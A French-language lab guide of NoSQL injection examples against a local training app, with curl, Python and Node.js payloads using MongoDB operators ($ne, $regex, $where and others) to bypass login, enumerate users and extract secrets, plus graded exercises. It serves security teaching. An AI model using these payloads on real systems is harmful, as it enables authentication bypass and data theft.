# EXEMPLES D'EXPLOITATION - NoSQL Injection Lab

## Scénario 1: Bypass d'authentification basique

### Injection avec $ne (Not Equal)

**Tentative normale (échoue):**
```bash
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":"wrongpassword"}'
```

**Injection réussie:**
```bash
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```

**Résultat:** Connexion en tant que premier utilisateur (probablement admin)

---

## Scénario 2: Énumération des utilisateurs

### Méthode 1: Regex pour brute force

**Trouver les utilisateurs commençant par 'a':**
```bash
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":"^a"},"password":{"$ne":null}}'
```

**Trouver les utilisateurs commençant par 'b':**
```bash
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":"^b"},"password":{"$ne":null}}'
```

### Méthode 2: Greater Than

**Tous les utilisateurs:**
```bash
curl -X POST http://localhost:3000/search \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":""}}'
```

---

## Scénario 3: Extraction de données sensibles

### Cibler un utilisateur spécifique

**Extraire le secret de l'admin:**
```bash
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"admin","password":{"$ne":null}}'
```

**Extraire le secret d'alice:**
```bash
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":{"$ne":null}}'
```

---

## Scénario 4: JavaScript Injection avec $where

### Exécution de code JavaScript

**Recherche avec condition JavaScript:**
```bash
curl -X POST http://localhost:3000/advanced-search \
  -H "Content-Type: application/json" \
  -d '{"query":"this.username == '\''admin'\''"}'
```

**Recherche par rôle:**
```bash
curl -X POST http://localhost:3000/advanced-search \
  -H "Content-Type: application/json" \
  -d '{"query":"this.role == '\''admin'\''"}'
```

**Extraction conditionnelle:**
```bash
curl -X POST http://localhost:3000/advanced-search \
  -H "Content-Type: application/json" \
  -d '{"query":"this.username.length > 3"}'
```

---

## Scénario 5: Opérateurs de comparaison

### $gt (Greater Than)

```bash
curl -X POST http://localhost:3000/search \
  -H "Content-Type: application/json" \
  -d '{"username":{"$gt":"a"}}'
```

### $in (In Array)

```bash
curl -X POST http://localhost:3000/search \
  -H "Content-Type: application/json" \
  -d '{"username":{"$in":["admin","alice","bob"]}}'
```

### $exists

```bash
curl -X POST http://localhost:3000/search \
  -H "Content-Type: application/json" \
  -d '{"username":{"$exists":true}}'
```

---

## Scénario 6: Combinaison d'opérateurs

### AND logique

```bash
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$regex":"^a"},"password":{"$gt":""}}'
```

### Négation multiple

```bash
curl -X POST http://localhost:3000/login \
  -H "Content-Type: application/json" \
  -d '{"username":{"$ne":""},"password":{"$ne":""}}'
```

---

## Tableau récapitulatif des opérateurs

| Opérateur | Fonction | Exemple d'injection |
|-----------|----------|---------------------|
| `$ne` | Not Equal | `{"username":{"$ne":null}}` |
| `$gt` | Greater Than | `{"username":{"$gt":""}}` |
| `$gte` | Greater Than or Equal | `{"age":{"$gte":18}}` |
| `$lt` | Less Than | `{"price":{"$lt":100}}` |
| `$regex` | Regular Expression | `{"username":{"$regex":"^a"}}` |
| `$where` | JavaScript Expression | `{"$where":"this.username=='admin'"}` |
| `$in` | In Array | `{"username":{"$in":["admin","bob"]}}` |
| `$nin` | Not In Array | `{"role":{"$nin":["guest"]}}` |
| `$exists` | Field Exists | `{"secret":{"$exists":true}}` |

---

## Analyse des réponses

### Succès d'exploitation

```json
{
  "success": true,
  "message": "Login successful!",
  "user": {
    "username": "admin",
    "email": "admin@vulnerable.local",
    "role": "admin",
    "secret": "FLAG{nosql_injection_master}"
  }
}
```

### Échec d'exploitation

```json
{
  "success": false,
  "message": "Invalid credentials"
}
```

### Erreur de syntaxe

```json
{
  "success": false,
  "message": "Server error",
  "error": "Malformed query"
}
```

---

## Tests avec Python

```python
import requests
import json

url = "http://localhost:3000/login"
headers = {"Content-Type": "application/json"}

# Bypass avec $ne
payload = {
    "username": {"$ne": None},
    "password": {"$ne": None}
}

response = requests.post(url, headers=headers, json=payload)
print(response.json())
```

---

## Tests avec JavaScript (Node.js)

```javascript
const axios = require('axios');

async function testInjection() {
  try {
    const response = await axios.post('http://localhost:3000/login', {
      username: { $ne: null },
      password: { $ne: null }
    });
    console.log(response.data);
  } catch (error) {
    console.error('Error:', error.response.data);
  }
}

testInjection();
```

---

## Exercices progressifs

### Niveau 1 - Débutant
- [ ] Exploiter `/login` avec `$ne` pour se connecter
- [ ] Récupérer le FLAG de l'admin

### Niveau 2 - Intermédiaire  
- [ ] Énumérer tous les usernames avec `$regex`
- [ ] Trouver tous les utilisateurs avec `$gt`
- [ ] Identifier les différents rôles

### Niveau 3 - Avancé
- [ ] Utiliser `$where` pour extraire des données
- [ ] Combiner plusieurs opérateurs
- [ ] Extraire les secrets de tous les utilisateurs

### Niveau 4 - Expert
- [ ] Écrire un script d'automatisation
- [ ] Identifier toutes les vulnérabilités dans le code
- [ ] Proposer des corrections sécurisées
